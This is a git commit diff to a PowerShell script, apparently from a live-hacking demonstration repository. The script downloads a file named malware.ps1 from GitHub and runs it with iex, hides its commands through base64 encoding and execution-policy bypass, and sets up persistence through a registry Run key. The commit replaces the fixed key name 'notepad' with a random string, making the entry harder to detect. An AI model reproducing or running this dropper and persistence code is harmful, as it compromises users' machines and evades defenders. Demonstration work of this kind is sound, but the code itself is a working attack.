5868bdaf9df27fa456520d69466347e7a7291f0b
Melfice60 <96183356+Melfice60@users.noreply.github.com>
2024-06-17 16:29:18 +0200

    Update s2.ps1

--- s2.ps1
+++ s2.ps1
@@ -5,7 +5,10 @@ $command1 = "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/FranceCyb
 $command2 = "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/malware.ps1 -UseBasicParsing|iex"
 $c1 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command1))
 $c2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command2))
+$length = 6
+$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+$randomString = -join ((0..$length-1) | ForEach-Object { $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)] })
 
 # Création de la nouvelle valeur dans la clé de Registre "Run"
-New-ItemProperty -Path $regPath -Name "notepad" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -EncodedCommand $c1" -PropertyType String -Force | Out-Null
+New-ItemProperty -Path $regPath -Name "$randomString" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -EncodedCommand $c1" -PropertyType String -Force | Out-Null
 powershell.exe -NoProfile -NonInteractive -Exec Bypass -EncodedCommand "$c2"
